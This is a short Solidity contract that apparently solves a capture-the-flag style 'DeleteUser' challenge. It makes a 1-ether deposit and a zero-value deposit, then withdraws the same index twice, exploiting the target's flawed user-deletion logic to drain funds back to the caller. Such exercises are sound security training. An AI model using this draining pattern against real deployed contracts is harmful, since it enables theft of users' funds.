pragma solidity 0.8.15;

import "./DeleteUser.sol";

contract SolveDeleteUser {
    constructor(DeleteUser instance) payable {
        require(msg.value == 1 ether, "1 ether is required");

        instance.deposit{value: 1 ether}();
        instance.deposit{value: 0}();

        instance.withdraw(1);
        instance.withdraw(1);

        payable(msg.sender).transfer(address(this).balance);
    }
}
